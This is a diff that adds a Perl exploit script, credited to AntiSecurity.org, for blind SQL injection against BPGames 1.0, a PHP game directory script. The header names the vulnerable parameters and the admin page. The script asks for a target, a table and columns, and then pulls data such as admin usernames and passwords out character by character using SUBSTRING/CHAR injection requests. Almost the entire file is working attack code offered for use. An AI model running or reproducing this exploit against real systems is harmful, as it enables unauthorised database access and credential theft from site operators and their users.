@@ -1,0 +1,125 @@
+#[x]===================================================================[x]
+# |                     AntiSecurity[dot]org			     	|
+#[x]===================================================================[x]
+# | Title    		: BPGames 1.0 blind SQL Injection Exploit    	|
+# | Software 		: BPGames				     	|
+# | Vendor   		: http://bpowerhouse.info		     	|
+# | Date    		: 22 September 2009 ( Indonesia )	     	|
+# | Author   		: OoN_Boy					|
+# | Contact  		: oon.boy9@gmail.com				|
+# | Web	    		: http://oonboy.info				|
+# | Blog     		: http://oonboy.blogspot.com			|
+#[x]===================================================================[x]
+# | Technology		: PHP                                           |
+# | Database		: MySQL                                         |
+# | Version		: 1.0                                           |
+# | License		: GNU GPL                                       |
+# | Price		: $29.90                                        |
+# | Description		: is a game directory site script. The script	| 
+# |			  supports multi-language settings. Site users	|
+# |			  can search for games according to categories	|
+#[x]===================================================================[x]
+# | Google Dork 	: gwe ganteng :P				|
+#[x]===================================================================[x]
+# | Exploit 		: http://localhost/[path]/main.php?cat_id=[sql]	|
+# |			  http://localhost/[path]/game.php?game_id=[sql]|
+# | Aadmin Page		: http://localhost/[path]/admin/index.php	|
+#[x]===================================================================[x]
+# | Greetz		: antisecurity.org batamhacker.or.id            |
+# |		 	  Vrs-hCk NoGe Paman zxvf Angela Zhang aJe H312Y|
+# |			  yooogy mousekill }^-^{ martfella noname s4va  |
+# | 		  	  k1tk4t str0ke kaka11 ^s0n g0ku^ Joe Chawanua	|
+# |			  Ntc xx_user s3t4n IrcMafia em|nem Pandoe Ronny|
+#[x]===================================================================[x]
+
+
+use HTTP::Request;
+use LWP::UserAgent;
+
+$cmsapp = 'BPGames';
+$vuln   = 'main.php?cat_id=';   #change vuln game.php?game_id=
+#vuln	= 'game.php?game_id=';
+$string = 'Previous';		#change if any string
+#string = 'Instrucciones';
+$maxlen = 32;
+
+my $OS = "$^O";
+if ($OS eq 'MSWin32') { system("cls"); } else { system("clear"); }
+
+printf "\n
+    $cmsapp
+ [x]=================================================[x]
+  |     BPGames 1.0 blind SQL Injection Exploit       |
+ [x]=================================================[x]
+
+\n";
+
+print " [+] URL Path : "; chomp($web=<STDIN>);
+print " [+] Valid ID : "; chomp($id=<STDIN>);
+print " [+] Table    : "; chomp($table=<STDIN>);	#table name admins
+print " [+] Columns  : "; chomp($columns=<STDIN>);	#column username and password
+
+if ($web =~ /http:\/\// ) { $target = $web."/"; } else { $target = "http://".$web."/"; }
+
+print "\n\n [!] Exploiting $target ...\n\n";
+&get_data;
+print "\n\n [!] Mission completed.\n\n";
+
+sub get_data() {
+	@columns = split(/,/, $columns);
+	foreach $column (@columns) {
+		print " [+] SELECT $column FROM $table LIMIT 0,1 ...\n";
+		syswrite(STDOUT, " [-] $table\@$column> ", 255);
+		for (my $i=1; $i<=$maxlen; $i++) {
+			my $chr = 0;
+			my $found = 0;
+			my $char = 48;
+			while (!$chr && $char<=57) {
+				if(exploit($i,$char) =~ /$string/) {
+					$chr = 1;
+					$found = 1;
+					syswrite(STDOUT,chr($char),1);
+				} else { $found = 0; }
+				$char++;
+			}
+			if(!$chr) {
+				$char = 97;
+				while(!$chr && $char<=122) {
+					if(exploit($i,$char) =~ /$string/) {
+						$chr = 1;
+						$found = 1;
+						syswrite(STDOUT,chr($char),1);
+					} else { $found = 0; }
+					$char++;
+				}
+			}
+			if (!$found) {
+				print "\n"; last;
+			}
+		}
+	}
+}
+
+sub exploit() {
+	my $limit = $_[0];
+	my $chars = $_[1];
+	my $blind = '+AND+SUBSTRING((SELECT+'.$column.'+FROM+'.$table.'+LIMIT+0,1),'.$limit.',1)=CHAR('.$chars.')';
+	my $inject = $target.$vuln.$id.$blind;
+	my $content = get_content($inject);
+	return $content;
+}
+
+sub get_content() {
+	my $url = $_[0];
+	my $req = HTTP::Request->new(GET => $url);
+	my $ua  = LWP::UserAgent->new();
+	$ua->timeout(5);
+	my $res = $ua->request($req);
+	if ($res->is_error){
+		print "\n\n [!] Error, ".$res->status_line.".\n\n";
+		exit;
+	}
+	return $res->content;
+}
+
+# Exploit End
